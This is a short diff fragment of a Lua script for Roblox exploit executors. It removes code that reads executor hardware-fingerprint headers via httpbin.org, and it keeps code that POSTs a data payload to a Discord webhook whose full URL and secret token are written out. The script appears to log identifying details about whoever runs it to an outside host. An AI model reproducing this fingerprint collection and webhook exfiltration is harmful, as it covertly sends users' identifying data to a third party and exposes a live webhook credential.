@@ -37,19 +37,7 @@ elseif SENTINEL_V2 then
     end
 end
 
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
 
-for i, v in next, hwid_list do
-    if decoded.headers[v] then
-        hwid = decoded.headers[v];
-        break
-    end
-end
-
-if hwid then
 local HttpServ = game:GetService('HttpService')
 local url = "https://discord.com/api/webhooks/915771298335031326/KlPNAmbp31k_0UFQI6QI7IIi3V2HteEWZyQOMF-fW2Eh_KwK98nzoNkDGMgkCYHPXc6n"
 
@@ -119,4 +107,3 @@ local data =
     
     local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
     http_request(request_payload)
-end
